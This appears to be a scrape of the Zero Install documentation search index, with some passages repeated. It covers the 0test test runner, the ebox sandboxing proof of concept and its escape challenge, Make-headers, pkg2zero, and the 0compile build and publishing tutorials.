We can see in this example that the unit-tests for 0compile 0.19 no longer pass, regardless of the version of Zero Install used. This problem was caused by a change to the GNU-Hello test program it uses within its own tests. Ideally, programs should depend on their test data using <requires> (see below), but 0compile actually needed to test downloading of the test code itself. 0compile 0.20 fails with older version of Zero Install due to a bug in the way \"0launch --get-selections\" generated the XML. 0compile 0.21 depends on a later version explicitly, so the broken combination is skipped. If you specify a test matrix with more than two dimensions, 0test will generate a series of tables. Other ways to specify versions \u00b6 As well as passing simple version numbers, you can also allow 0test to choose a suitable version given some constraints. This is useful in test scripts: Ranges \u00b6 You can use , to give a range of possible versions. This is useful with native packages where you don't know the exact version. For example, to test against any Python version 2.6.x (2.6 <= version < 2.7): $ 0test prog.xml https://apps.0install.net/python/python.xml 2 .6,2.7 Passed - prog 0 .1, python v2.6.8-0.2 %nonlocal \u00b6 Don't select a local (i.e. unreleased) version to test against: $ 0test prog.xml Passed - prog 0 .1, lib v1.11-post $ 0test prog.xml http://example.com/lib %nonlocal Passed - prog 0 .1, lib v1.11 Passing test arguments \u00b6 You can pass extra arguments to the test command, but you must put them after -- to stop 0test interpreting them as arguments or versions. e.g. to run 0test on 0compile with verbose output: $ 0test http://0install.net/2006/interfaces/0compile.xml -- -v Specifying a test command \u00b6 The --test-command (or -t ) option can be used to run the shell command of your choice, rather than the \"test\" <command> given in the feed. The command that would be executed if the implementation were run normally is available as $* . For example, to check that rox --version worked in versions 2.8 and 2.9 of ROX-Filer: $ 0test -t '$* --version > /dev/null' \\ http://rox.sourceforge.net/2005/interfaces/ROX-Filer 2 .8 2 .9 Passed - ROX-Filer v2.8 - ROX-Filer v2.9 None skipped None failed You can use --command to select a different <command> . By default, the command used is test when run normally, or run when using -t . You can also set this to the empty string to select no command (useful with libraries). In that case, $1 is the directory itself rather than the command. Test-only dependencies \u00b6 You can pass extra arguments and specify test-specific dependencies in the <command> , as usual. For example: <group> <requires interface= \"http://example.com/somelib.xml\" > ... </requires> <command name= \"test\" path= \"tests/testall.py\" > <requires interface= \"http://testing.com/testframework.xml\" > <environment insert= \"\" mode= \"replace\" name= \"TEST_FRAMEWORK\" /> </requires> </command> <implementation id= \".\" version= \"0.1-pre\" /> </group>","title":"0test"},{"location":"tools/0test/#0test","text":"Maintainer: Thomas Leonard License: GNU General Public License Source: https://github.com/0install/0test Zero Install feed: http://0install.net/2008/interfaces/0test.xml A Zero Install feed can specify a \"test\" command, which can be run to test the program automatically. 0test runs this command.

Ideally, programs should depend on their test data using <requires> (see below), but 0compile actually needed to test downloading of the test code itself. 0compile 0.20 fails with older version of Zero Install due to a bug in the way \"0launch --get-selections\" generated the XML. 0compile 0.21 depends on a later version explicitly, so the broken combination is skipped.

It allows you to install programs and run them in a restricted environment. Despite this, the programs still benefit from Zero Install's dependency handling, automatic updates, sharing, etc. Overview \u00b6 A secure system should allow the user to install and run software with limited privileges, so that the damage that can be caused by malicious software is limited. The sandboxing should be simple enough that it can be used by all users as a matter of course. Zero Install is designed to solve the installation part of this problem, and is intended to integrate with existing sandboxing tools to provide the rest. The purposes of this page are: To make it clear what we hope to achieve with Zero Install. To demonstrate that such integration is possible, and provide an example of how to do it. To find bugs or weaknesses in Zero Install's implementation or design. Different sandboxes provide different features. Ideally we would use an OS-level tool that could sandbox any application (e.g. Plash). However, these are not yet widely available, difficult to deploy, or only available on certain systems. Therefore, this example uses application-level sandboxing instead (relying on security features of the programming language rather than those of the operating system). The advantage is that it should work everywhere. The disadvantage is that it only works with programs written in that language. We start with a tutorial showing how to install and run a couple of sample applications. Then we present a challenge: modify the sample applications to escape from the sandbox! If you find a security flaw, please report it to the mailing list , and I'll add you to the high-score table: Date Finder Flaw - (your name here!) - (challenge open since Aug 2010) Tutorial \u00b6 You can create a short-cut to ebox with 0install add , like this: $ 0install add ebox http://0install.net/tests/ebox.xml You can then install a program like this: $ ebox ~/edit http://0install.net/tests/ebox-edit.xml Created instance directory. To run: ~/edit/AppRun This creates a directory at the path you specified ( ~/edit ). This directory contains all the program's configuration, and a script to start it (AppRun). [ Technically, it's a ROX application directory , but whereas these normally include program code (but no configuration), this one includes only configuration, with the code going in the Zero Install cache. ] If you run the ~/edit/AppRun script, a fairly normal-looking text editor should appear. You can open, edit and save files just as you'd expect: However, the program is running in a restricted environment. It can only access files that you select using a file selector dialog box. It's hard to demonstrate this security, because permission is granted automatically by your actions, so you should try attacking it to convince yourself. What a boxed program can and can't do \u00b6 Every window it opens is prefixed with the name you gave it (e.g. edit: <untitled> ). It can't access a file unless you explicitly select it, or pass it as a command-line argument. It can't send a copy of a file you open over the network (see below for network access). It can read and write files under its own data directory ( ~/edit/data/* ) If you grant it access to something (e.g. read access to a file), it could persist this in ~/edit/auths/* so it still has it next time you run the program, although ebox-edit itself doesn't do this. It can open any number of windows, use up lots of CPU time, etc. Networking \u00b6 Next, we'll try a program that uses the network: $ ebox alicesChat http://0install.net/tests/ebox-chat.xml Notice that ebox-chat uses the same library (ebox-help) as ebox-edit, and so they share a single copy: ebox-chat is a simple chat program. When you run it, it will ask for permission to access the network: Once you give it network access, it is able to store it for later (creating the file alicesChat/auths/network ), so you won't have to reconfirm each time it starts. It then displays an (empty) list of contacts. We'll need someone to talk to. This could be on another machine, or you can take advantage of the sandboxing to create a second instance on the same machine. We'll pretend that the first instance is running on Alice's computer, and the second is Bob's: $ ebox bobsChat http://0install.net/tests/ebox-chat.xml We don't have to worry that these two programs will conflict or try to use the same configuration; they can each only access files inside their own directory by default. Of course, the actual program code is shared between them. When you run bobsChat, you'll need to grant that network access too. Add a contact called \"Bob\" to Alice's contacts list, and a contact called \"Alice\" to Bob's list. One of them should send an invitation (a file), and the other should accept it. The invitation file should be transferred over some secure channel and kept safe until pairing is complete. Note that ebox-chat is a peer-to-peer chat program with no central server. If there are firewalls or NATs between the machines, things get \"interesting\"... it's only a demo after all ;-) Once paired, either party can call the other: The challenge! \u00b6 I have a file, /home/tal/precious.txt , containing some important information. Your challenge is to either discover the contents of this file or to change it. You do this by creating a malicious application (e.g. by modifying ebox-edit or ebox-chat). I will install your program and try using it for a bit. If Zero Install warns me that your key isn't trusted, I'll ignore it and trust the key anyway. I will also approve any keys needed for any libraries you depend on. Since I don't trust your program, I won't try to open my precious file in it. I will be happy to create and edit test files, though. The precious.txt file has no special protection: it's a regular text file, readable and writable by me (if I ask ebox-edit to open it, it will). For this challenge, we exclude denial-of-service attacks (e.g. if you make my computer run so slowly I have to reboot it). The easiest way to get started is to clone ebox-edit's Git repository and create a new instance from its local feed: $ git clone git://zero-install.git.sourceforge.net/gitroot/zero-install/ebox-edit $ ebox test-instance ebox-edit/edit.xml $ ./test-instance/AppRun You can try to modify the files in the checkout to escape from the sandbox. The syntax is explained in the Walnut guide to E . Bonus challenge! \u00b6 Alternatively, you could clone the ebox-help Git repository and modify the library. Register your modified library with 0install (using 0install add-feed ebox-help/help.xml ) and run a program that depends on it. You should find that the library runs in an even more restricted environment; it doesn't even get access to the application data! This demonstrates an interesting feature of ebox. Zero Install normally tells a component (such as ebox-edit) how to find a dependency (ebox-help) by setting environment variables (e.g. $CLASSPATH ). Environment variables are global to the process. Instead, ebox makes the dependency appear directly as a variable in the module's scope. For example, ebox-edit declares a dependency on ebox-help like this: <requires interface= \"http://0install.net/tests/ebox-help.xml\" > <environment insert= \"\" name= \"help\" /> </requires> It then creates a help window by calling <help:makeHelp>(shell, <this:manual>) . Here, the <help> loader is injected directly by ebox, and scoped to the ebox module: To code in ebox-edit, <help> refers to the ebox-help library, while <this> refers to ebox-edit. To code in ebox-help, <help> is not visible, while <this> refers to ebox-help. This means that libraries can't conflict even within a process. elib-help can't override a function defined in ebox-edit, for example, so the ebox-edit author doesn't need to fully trust the help library! Notes \u00b6 To make this useful, we need to integrate with a general purpose sandbox, such as Plash, so we can sandbox any application, not just those written in E. The long startup time for edit and chat is simply because they're running on Java, not because of the sandboxing. If a networked application (e.g. ebox-chat) seems to freeze, try wiggling the mouse; it might just need more entropy to generate random numbers for the crypto. About E: the important point here isn't how this particular sandbox works, but how sandboxing can be supported by Zero Install in general. However, here are some useful links about E and its underlying security model: http://wiki.erights.org/wiki/Walnut/Secure_Distributed_Computing http://en.wikipedia.org/wiki/Object-capability_model Conclusions \u00b6 Zero Install can be used to install and run sandboxed software. It does not execute any of the downloaded code outside of the sandbox and installation of malicious code does not affect other programs on the computer, even those running as the same user. Despite this, libraries are shared automatically between programs (sandboxed or not), update notifications work as normal, etc. In addition to its normal mode of operation, in which it sets environment variables to let components find their dependencies, Zero Install can also integrate tightly with a particular programming language, injecting scoped dependencies directly into individual modules within the language.","title":"ebox"},{"location":"tools/ebox/#ebox","text":"Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: https://github.com/0install/ebox Zero Install feed: http://0install.net/tests/ebox.xml EBox is a proof-of-concept that integrates Zero Install's safe installation with E's sandboxing features.

It performs the following steps: Runs $SRCDIR/configure --prefix $DESTDIR && make install Notes the version numbers in any lib*.so symlinks (see below) Deletes $DESTDIR/{bin,man,share} , any library binaries ( .so , .a and .la files in lib ), and any lib/python * directories. Edits any pkg-config files ( lib/pkgconfig/*.pc ) to use a relative prefix of ${pcfiledir}/../.. . In other words, it does a full compile-and-install to $DESTDIR, deletes anything that isn't needed in a -dev package, and makes the result relocatable. It can be used as the compile command in a source implementation. For example, the GLib-dev feed contains this entry: <group arch= \"*-src\" compile:command= '\"$BUILD_COMMAND\"' > <implementation id= \"sha1new=fd1cf4afd14067866e626a2c91f9839f4639e604\" released= \"2007-03-04\" stability= \"stable\" version= \"2.4.8\" > <archive extract= \"glib-2.4.8\" href= \"ftp://ftp.gtk.org/pub/gtk/v2.4/glib-2.4.8.tar.bz2\" size= \"2152755\" type= \"application/x-bzip-compressed-tar\" /> </implementation> <requires interface= \"http://0install.net/2007/interfaces/Make-headers.xml\" > <environment insert= \"make-headers.py\" name= \"BUILD_COMMAND\" /> </requires> This allows 0compile to create the GLib-dev package from the upstream source automatically. Note If your package creates script files in bin that are part of the -dev package (i.e. they are used when building programs that use the library) then use --keep=bin to prevent them from being deleted. Major version mappings \u00b6 There is a particular issue that comes up if you want to provide the header files ( *.h ) through Zero Install, but have the user get the run-time files (*.so) through their distribution. First, some background: Library versioning on Linux/Unix systems \u00b6 The obvious way to store a shared library object in a package is to give it a simple name like libfoo.so . The packaging system selects which version of this file to use and the program loads it. Easy. This is how a pure Zero Install system would work. However, in a traditional packaging system (apt, make install, etc), where library files go in a single directory (e.g. /usr/lib ), this would make it impossible to have two versions of a library installed at once. As a special work-around, shared library objects include their version number in their name (e.g. libfoo.so.1.2.3 ). You (or your package manager) then adds two symlinks: libfoo.so is the symlink used when compiling libfoo.so.1 is the symlink used when running (here 1 is the \"major\" part of the version number from our example of 1.2.3 ) The idea is that you make sure libfoo.so points to the correct version and then compile your code. The compiled binary takes the first part of the version number (here 1 ) and stores libfoo.so.1 as its dependency. When run, it uses the second symlink to find the actual library version. Minor (compatible) upgrades to the library have the same major version. For example, after installing a minor update the symlinks will point to libfoo.so.1.3.0 , still with major version 1 . For major (incompatible) changes, the major version number is changed. After installing a major upgrade ( 2.0.0 ), you have three symlinks: libfoo.so.1 to libfoo.1.2.3 (from the previous version) libfoo.so.2 to libfoo.2.0.0 libfoo.so to libfoo.2.0.0 Programs that need version 1 of the library can no longer be compiled (they try to use libfoo.so and fail), but any existing binaries will still run (they try to use libfoo.so.1 and succeed). This is pretty horrible, but it's the way it works. The real problem is that the source code doesn't say what major version of the library it needs; it just fails to compile if you get it wrong, and you can only have the ability to compile against one version at a time. Obviously, this scheme doesn't work in Zero Install, since installing a package is always side-effect-free. Preventing old programs from compiling would clearly be a side-effect. In a pure Zero Install system, you can always use the simple scheme above and everything works correctly. In fact, to avoid changing existing libraries, we usually do include the version number in the library name, and we include both symlinks in the runtime package. This doesn't do any harm, because Zero Install keeps files from different packages in different places. Using Zero Install -dev packages with distribution runtime packages \u00b6 However, what if you want to combine both systems? That is, what if you want to get the header files through Zero Install but get the runtime shared object through your distribution's packaging system? Then there is a small problem. In Zero Install, we have: A library package contains the libfoo.so and libfoo.so.version files. A -dev package contains the header files. In a distribution package: A library package contains the libfoo.so.version file only. A -dev package contains headers and the libfoo.so file (only one -dev package can be installed at once). So, if you tried to use a Zero Install -dev package with a distribution library package, no one provides the libfoo.so file and the link fails. To fix this, a Zero Install -dev package can specify the mappings from library names to major version numbers, like this: <interface uri = '.../libfoo-dev' > ... <implementation compile:lib-mappings = \"foo:1\" ... /> When 0compile compiles anything that depends on this -dev package, it searches for libfoo.so.1 (provided by the distribution) in the library search path and creates a symlink to it named libfoo.so in a temporary directory, which it adds to the search path. Programs should then compile correctly without modifications. Multiple mappings can be given in the attribute, separated by spaces. To be clear: a Zero Install source package depends on the library -dev package using the normal Zero Install mechanism ( <requires ...> <version ...> ). Having selected a suitable version of the -dev package, Zero Install uses the mappings inside it to work out what the compiled binary should link against. The source for a -dev package can use compile:binary-lib-mappings to have this value placed in the generated -dev \"binary\" package. However, starting with version 0.3, Make-headers can automatically work out the correct values and add them to the feed. In summary: If you are creating a source package that depends on a library, ignore all this and just put in a normal Zero Install dependency. 0compile will handle the mappings for you. If you are publishing an existing -dev package for a library that isn't in Zero Install, remember add the lib-mappings attribute. If you are publishing source for a -dev package, Make-headers should add the correct values for you automatically.","title":"Make-headers"},{"location":"tools/make-headers/#make-headers","text":"Maintainer: Thomas Leonard License: GNU General Public License Source: http://repo.or.cz/w/make-headers.git Zero Install feed: http://0install.net/2007/interfaces/Make-headers.xml Make-headers is an extremely simple script for creating -dev packages (packages containing only header files) from ordinary source releases. It performs the following steps: Runs $SRCDIR/configure --prefix $DESTDIR && make install Notes the version numbers in any lib*.so symlinks (see below) Deletes $DESTDIR/{bin,man,share} , any library binaries ( .so , .a and .la files in lib ), and any lib/python * directories. Edits any pkg-config files ( lib/pkgconfig/*.pc ) to use a relative prefix of ${pcfiledir}/../.. . In other words, it does a full compile-and-install to $DESTDIR, deletes anything that isn't needed in a -dev package, and makes the result relocatable. It can be used as the compile command in a source implementation. For example, the GLib-dev feed contains this entry: <group arch= \"*-src\" compile:command= '\"$BUILD_COMMAND\"' > <implementation id= \"sha1new=fd1cf4afd14067866e626a2c91f9839f4639e604\" released= \"2007-03-04\" stability= \"stable\" version= \"2.4.8\" > <archive extract= \"glib-2.4.8\" href= \"ftp://ftp.gtk.org/pub/gtk/v2.4/glib-2.4.8.tar.bz2\" size= \"2152755\" type= \"application/x-bzip-compressed-tar\" /> </implementation> <requires interface= \"http://0install.net/2007/interfaces/Make-headers.xml\" > <environment insert= \"make-headers.py\" name= \"BUILD_COMMAND\" /> </requires> This allows 0compile to create the GLib-dev package from the upstream source automatically.

You will then be prompted to \"Enter the URI for this feed\". This is the URL from which other people will download your feed file. Note pkg2zero guesses some things (such as which binary to run by default if the package contains several) so you should check the feed file manually and edit if required. In this case, no editing is needed. Testing \u00b6 When testing, you should make sure that the program isn't already installed (e.g. by apt-get ).

For this to work, you need to create a file called ~/.config/0install.net/pkg2zero/mappings (see the freedesktop.org basedir specification for details about configuration file locations). Each line of the file gives a mapping from a Debian package name to the corresponding Zero Install feed URI. For example, if you specify: libfoo: http://0install.net/2008/3rd-party/libfoo.xml then pkg2zero will turn Depends: libfoo into <requires interface= \"http://0install.net/2008/3rd-party/libfoo.xml\" > <environment insert= \"usr/lib\" name= \"LD_LIBRARY_PATH\" /> </requires> Note that setting LD_LIBRARY_PATH is just a guess. It may be that the package depends on libfoo in some other way (e.g. it needs a binary in $PATH ). In that case, you'll need to edit the feed to correct it. When you create a new feed, pkg2zero automatically appends the new mapping to the mappings file for you. The last line of the file is also used to suggest a default when naming new feeds.

However, if a file with the same name already exists in the current directory, it uses that instead.

However, it can also be used to compile a new binary from a source package. This is useful if: no binary is available for your platform; you wish to build using different library versions; or you wish to make changes to a program or library. This tutorial shows how to use 0compile for these purposes. It is assumed that you have already installed Zero Install and know how to run programs using it. To get 0compile itself, use: $ 0install add 0compile http://0install.net/2006/interfaces/0compile.xml Note This page describes the command-line interface to 0compile . There is also a graphical interface, which is used when you click on the Compile button in the 0install GUI. The graphical interface provides similar options, but is slightly more limited. Autocompile \u00b6 If you just want to compile some existing source code (without changing it), then the autocompile sub-command does the job. Given the URI of a program, it will download and compile the source in a temporary directory, add the resulting binary to the Zero Install cache, and register the new binary. If the source depends on other programs, it will also download and compile them in the same way if no binary is currently available for the preferred version. For example (GNU-Hello is a simple test program which depends only on make ): $ 0compile autocompile http://0install.net/tests/GNU-Hello.xml ================= http://0install.net/tests/GNU-Hello.xml ================== Selecting versions for GNU Hello... Selection done . Plan: - GNU Hello: Compile 1 .3 ( sha1 = 2aae32fd27d194167eac7eb611d7ce0983f83dd7 ) - make: Use existing binary 3 .81-5 ( Linux-x86_64 ) No dependencies need compiling... compile GNU Hello itself... Waiting for selected implementations to be downloaded... ... Note that GNU-Hello does not get the C-compiler through Zero Install, so you will need that already (hint: apt-get install build-essential ). Once compiled, you can run it like this: $ 0install run http://0install.net/tests/GNU-Hello.xml Hello, world! You can also use autocompile --gui for a graphical version. This makes it easier to see the overall progress, because the verbose build output is shown separately in the lower pane: Manual compilation \u00b6 If you want to modify the source before building, keep the object files around for rebuilding, or choose the versions used, you'll want to use the manual commands, described in the following sections. Creating the build environment \u00b6 To get started, run 0compile setup with the URL of the program you want to build. In this example, we'll use GNU-Hello , a simple program written by the FSF to demonstrate use of the popular GNU build tools: $ 0compile setup http://0install.net/tests/GNU-Hello.xml GNU-Hello Created directory GNU-Hello 0compile will run 0install select --source to select a suitable version of the source code and download it. It will also locate and download any dependencies (e.g. build tools or header files) the source may have. It will download the make utility in this case, or use your distribution's package. The final argument names a directory for the build environment. If omitted, it defaults to the last component of the URI, without the .xml extension (so we could have just left it off in this case). 0compile will create this directory in the current directory. All further 0compile commands are run from inside this new directory, which is currently empty except for a 0compile.properties file recording the URI of the program. If you want to change the selected version(s) later, do: $ cd GNU-Hello $ 0compile setup Building \u00b6 To compile the program, use the build command (from inside the GNU-Hello directory): $ 0compile build TMPDIR = /tmp/0compile-T5GJBj BUILDDIR = /home/me/GNU-Hello/build DISTDIR = /home/me/GNU-Hello/gnu-hello-linux-x86_64-1.3 SRCDIR = /home/me/.cache/0install.net/implementations/... cd /tmp/GNU-Hello/build Executing: \" $SRCDIR /configure\" --prefix = \" $DISTDIR \" && make install ... Note GNU-Hello does not use Zero Install to get the C compiler ( gcc ) or the standard library header files ( libc-dev ), so you should install these yourself. They come with most distributions. 0compile starts by creating two sub-directories: gnu-hello-linux-x86_64 for the final result (the exact name will depend on your system) and build for any temporary files. It then executes a command specified in the source feed, which actually builds the software (using the standard GNU build system in this case). Note that the command installs to the gnu-hello-linux-x86_64 directory rather than to the usual /usr/local . Assuming the build is successful, gnu-hello-linux-x86_64 will contain the final result, including a handy gnu-hello-linux-x86_64/0install/feed.xml local feed file, which you can use to run the new binary (note: this used to be gnu-hello-linux-x86_64/0install/GNU-Hello.xml on older versions of 0compile): $ 0install run gnu-hello-linux-x86_64/0install/feed.xml Hello, world! In fact, since GNU-Hello doesn't list any run-time dependencies, we could have just run the gnu-hello-linux-x86_64/bin/hello binary directly in this case. For more complex programs, the feed file will be useful. You can also pass it to 0install add-feed to register the new binary under the program's normal URI: $ 0install run -c http://0install.net/tests/GNU-Hello.xml Interface 'http://0install.net/tests/GNU-Hello.xml' has no usable implementations $ 0install add-feed gnu-hello-linux-x86_64/0install/feed.xml 1 ) Add as feed for 'http://0install.net/tests/GNU-Hello.xml' $ 0install run -c http://0install.net/tests/GNU-Hello.xml Hello, world! If everything worked, you can now delete the build directory to save space. However, if you're planning to modify the source and rebuild (described in the next section) then you'll want to leave it there, as it will make rebuilding faster. For future reference, there is also a gnu-hello-linux-x86_64/0install/build-environment.xml file. This is a selections file, as produced by 0install select --source --xml , but with a few extra details of the build added, including the hostname of the machine used for the build, a timestamp and your username. You can use this to rebuild later with the same environment (e.g. using this exact version of make ). The file is written before the build starts, so the build process may add to it. Modifying the source \u00b6 By default, 0compile keeps the source code in the (read-only) Zero Install cache, so if you want to make changes, the first step is to make a copy of it: $ 0compile copy-src Copied as '/home/me/GNU-Hello/src' Edit the source as needed with the text editor of your choice. For example, we can change the message (here we're using ed, the standard text editor ): $ ed src/hello.c 5207 %s/Hello, world!/Goodbye, world!/ wq 5209 Recompile with 0compile build as before: $ 0compile build $ 0install run gnu-hello-linux-x86_64/0install/feed.xml Goodbye, world! If you compare the new gnu-hello-linux-x86_64/0install directory with the old one, you'll discover a couple of differences: A new file is present, gnu-hello-linux-x86_64/0install/from-1.3.patch , containing a diff between the original sources and your modified ones (to display this without rebuilding, use 0compile diff ). The version number in the local feed has -1 appended, to indicate that this version has been modified. These two features make it very easy to keep track of what you changed, which may well come in handy later! However, if you are making larger changes to the code then you will want to use a proper version control system (such as Git ). Publishing the binary \u00b6 Use 0compile publish to create the archive and feed: $ 0compile publish Generated archive 'gnu-hello-linux-x86_64-1.3.tar.bz2' and feed 'GNU-Hello-1.3.xml' . Upload it to a repository with: 0repo add GNU-Hello-1.3.xml You can test it with: $ 0install run GNU-Hello-1.3.xml To publish the feed and archive, use 0repo (see that page for configuration details): $ 0repo add GNU-Hello-1.3.xml Bundling dependencies \u00b6 You might want to build on a machine without network access, or to archive everything needed to build a particular program. To do that, use this command: $ 0compile include-deps The source code and all dependencies will be copied into a new dependencies sub-directory. When building, this directory is added to the implementation cache search path (using 0install run --with-store ). Legacy helper features \u00b6 0compile has some special code to detect and handle some common cases in legacy code: Generated pkgconfig files with absolute paths \u00b6 If $DISTDIR ends up containing a directory called pkgconfig , it checks each .pc file inside for an absolute prefix. If found, it is changed to a relative path. Note For \"pure\" Zero Install libraries, just use a relative path (e.g. prefix=${pcfiledir}/.. ) in the .pc file in the source, and copy it unchanged to $DISTDIR . Build dependencies containing /usr/lib/lib*.so broken symlinks \u00b6 RPM unpacks all packages over the root, so one package can have a symlink to a file provided by a different package. This is often used to set the default version of a library in RPM packages. e.g. -devel package: libSDL.so -> libSDL-1.2.so.0.11.2 (broken link) runtime package: provides libSDL-1.2.so.0.11.2 Since Zero Install keeps every package in its own directory, this doesn't work. Therefore, 0compile searches for such broken links, searches for a matching target, and creates a fixed link in a temporary directory, added to LD_LIBRARY_PATH . This makes it easy to depend on unmodified -devel packages which were designed for non-Zero Install systems. Note A \"pure\" Zero Install library wouldn't need to include the version number in the library filename, so no symlink would be needed. If you did want to include the number in the filename, the symlink to it would go in the runtime package, not the -dev el package. Build dependencies with lib64 directories \u00b6 If the feed tries to add a directory under lib or usr/lib to $PKG_CONFIG_PATH , and the directory doesn't exist, 0compile uses the corresponding lib64 directory instead, if present. This is for existing RPMs which use a different directory structure for different architectures. Libtool archive (.la) files \u00b6 0compile searches for lib/*.la files in $DISTDIR and automatically deletes them for you (there is a safely check that it really is a libtool file first). These files were only needed on very old systems that don't support dynamic linking. These days they just cause trouble by using absolute paths which were only valid during the build. Recreating a build environment \u00b6 If you want to rebuild a binary package, see if it includes the 0install/build-environment.xml file that 0compile generates automatically. If so, you can re-create the build like this: $ 0compile setup .../someprog-binary/0install/build-environment.xml some-prog $ cd some-prog $ 0compile build For example, in the GNU-Hello case this would allow you to build using the same source code and the exact same version of make used in the original compile. Making source available \u00b6 If you want to publish source code so that other people can compile it using 0compile, see 0compile: Developers . Building in a clean chroot \u00b6 If you want to build the source package in a clean chroot sandbox environment, see 0compile: Chroot Build .","title":"0compile"},{"location":"tools/0compile/#0compile","text":"Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: https://github.com/0install/0compile Zero Install feed: http://0install.net/2006/interfaces/0compile.xml Normally, Zero Install will select a pre-built binary for your system. However, it can also be used to compile a new binary from a source package. This is useful if: no binary is available for your platform; you wish to build using different library versions; or you wish to make changes to a program or library. This tutorial shows how to use 0compile for these purposes. It is assumed that you have already installed Zero Install and know how to run programs using it. To get 0compile itself, use: $ 0install add 0compile http://0install.net/2006/interfaces/0compile.xml Note This page describes the command-line interface to 0compile . There is also a graphical interface, which is used when you click on the Compile button in the 0install GUI.

Given the URI of a program, it will download and compile the source in a temporary directory, add the resulting binary to the Zero Install cache, and register the new binary. If the source depends on other programs, it will also download and compile them in the same way if no binary is currently available for the preferred version. For example (GNU-Hello is a simple test program which depends only on make ): $ 0compile autocompile http://0install.net/tests/GNU-Hello.xml ================= http://0install.net/tests/GNU-Hello.xml ================== Selecting versions for GNU Hello...

Waiting for selected implementations to be downloaded... ... Note that GNU-Hello does not get the C-compiler through Zero Install, so you will need that already (hint: apt-get install build-essential ).

Note GNU-Hello does not use Zero Install to get the C compiler ( gcc ) or the standard library header files ( libc-dev ), so you should install these yourself. They come with most distributions. 0compile starts by creating two sub-directories: gnu-hello-linux-x86_64 for the final result (the exact name will depend on your system) and build for any temporary files. It then executes a command specified in the source feed, which actually builds the software (using the standard GNU build system in this case). Note that the command installs to the gnu-hello-linux-x86_64 directory rather than to the usual /usr/local . Assuming the build is successful, gnu-hello-linux-x86_64 will contain the final result, including a handy gnu-hello-linux-x86_64/0install/feed.xml local feed file, which you can use to run the new binary (note: this used to be gnu-hello-linux-x86_64/0install/GNU-Hello.xml on older versions of 0compile): $ 0install run gnu-hello-linux-x86_64/0install/feed.xml Hello, world! In fact, since GNU-Hello doesn't list any run-time dependencies, we could have just run the gnu-hello-linux-x86_64/bin/hello binary directly in this case. For more complex programs, the feed file will be useful. You can also pass it to 0install add-feed to register the new binary under the program's normal URI: $ 0install run -c http://0install.net/tests/GNU-Hello.xml Interface 'http://0install.net/tests/GNU-Hello.xml' has no usable implementations $ 0install add-feed gnu-hello-linux-x86_64/0install/feed.xml 1 ) Add as feed for 'http://0install.net/tests/GNU-Hello.xml' $ 0install run -c http://0install.net/tests/GNU-Hello.xml Hello, world!

Publishing source this way means that: Users can compile it easily using 0compile . Build dependencies, such as header files and build tools, can be downloaded automatically. 0release can automatically compile binaries for your software during the release process. Making source available \u00b6 There are two common situations: You already have a source tarball somewhere and you want to publish an XML feed saying how to download and compile it (ideally, no changes should be needed to support 0install). For this, you should first read the Guide to packaging binaries . You have a development checkout (e.g. a Git clone or similar) and you want to say how to compile it. For this, you should first read the page about local feeds . To make source code available for others to use you need to add source implementations to the program's feed file. This is almost exactly the same as adding binaries, except that you give src as the machine (CPU) type: (if you want to script this process, take a look at 0template ) You can also edit the XML directly, which gives more control. A minimal source implementation might look like this: <implementation arch= \"*-src\" id= \".\" version= \"0.1-pre\" > <command name= 'compile' path= 'Makefile' > <runner interface= 'https://apps.0install.net/devel/make.xml' > <arg> -f </arg> </runner> </command> </implementation> Note You only need to use arch='*-src' to publish implementations for things that need to be compiled. Shell scripts, etc should not be marked as source code; use arch=\"*-*\" instead (which is the default anyway if arch is not given). For header files (-dev packages), there will often be a source implementation that generates the header files, but the resulting headers are not source (and will often be architecture-specific, e.g. Linux-i386 ). The job of the compile command is to call the actual build system. It is executed inside the build directory ( $BUILDDIR ). It must compile the source in $SRCDIR , putting the final result (ready for distribution) in $DISTDIR . The path to the generated feed for the new binary is $BINARYFEED , if you need it during the build. Instead of giving a <runner> , you may prefer to use a shell command. This is useful if you need to run more than one command. However, if the command starts to get complicated, you should move it to a script, either inside the main source archive or in a separate dependency, and just set this attribute to the command to run the script): <implementation arch= \"*-src\" id= \".\" version= \"0.1-pre\" > <command name= 'compile' shell-command= '\"$SRCDIR/configure\" --prefix=\"$DISTDIR\" && make install' /> <requires interface= 'https://apps.0install.net/devel/make.xml' > <executable-in-path name= 'make' /> </requires> </implementation> Starting with 0compile 1.1, this even works on Windows (it uses win-bash). There are also some extra attributes you can add to the implementation element: compile:binary-main Deprecated. Use <compile:implementation> instead (see below). compile:dup-src Some programs insist on creating files in their source directory, which is typically a read-only directory when using Zero Install. In this case, set compile:dup-src='../img/true' and 0compile will copy everything in $SRCDIR into build before building. compile:binary-lib-mappings (binary library major mappings) This is needed if you want to use 0install to compile a -dev package (containing header files) that works with a distribution-provided runtime package; see MakeHeaders for details. Customising the binary implementation \u00b6 You can specify a template <implementation> for the binary using <compile:implementation> . You can use this, for example, to add <command> elements to it. Here's a more complex example for a Java program: ... xmlns:compile=\"http://zero-install.sourceforge.net/2006/namespaces/0compile\" ... <implementation arch= \"*-src\" id= \".\" version= \"0.1-pre\" > <command name= \"compile\" path= \"src/Makefile\" > <runner interface= 'https://apps.0install.net/devel/make.xml' > <arg> -f </arg> </runner> <compile:implementation arch= '*-*' > <environment name= 'CLASSPATH' insert= '.' /> <requires interface= \"https://apps.0install.net/utils/graphviz.xml\" /> <command name= 'run' > <runner interface= 'https://apps.0install.net/java/jre.xml' /> <arg> com.example.MainClass </arg> </command> </compile:implementation> </command> <requires interface= \"https://apps.0install.net/java/iris.xml\" compile:include-binary= 'true' /> <requires interface= \"https://apps.0install.net/java/jdk.xml\" > <environment name= 'PATH' insert= 'bin' /> </requires> </implementation> The interesting bits here are: arch=\"*-src\" tells us that the root <implementation> describes some source code. <compile:implementation> this is the template for the implementation that will be created by the compile. arch='*-*' indicates that the generated binary is platform independent (Java bytecode). <command name='run'> says how to run the resulting binary (by using the Java runtime). The dependencies are: graphviz and openjdk-jre only used at run-time (since they occur inside the <compile:implementation> ). openjdk-jdk only used at compile-time (occurs directly inside the source <implementation> ). iris used at compile-time and at run-time (has compile:include-binary attribute). Finally, there is a compile:if-0install-version attribute that you can place on any element in the template. 0compile will convert this to a plain if-0install-version in the generated output (you can't use if-0install-version directly because 0install would strip them out as appropriate for its version before 0compile saw them). Pinning version ranges \u00b6 Sometimes, you have a build time dependency with a wide range of possible versions, but the generated binary will have a runtime dependency on whichever version was used to compile it. The compile:pin-components attribute on a <version> element in the template will expand into before and after attributes that require the binary version to match the first n components of the version used to compile it. For example, if this program is compiled using 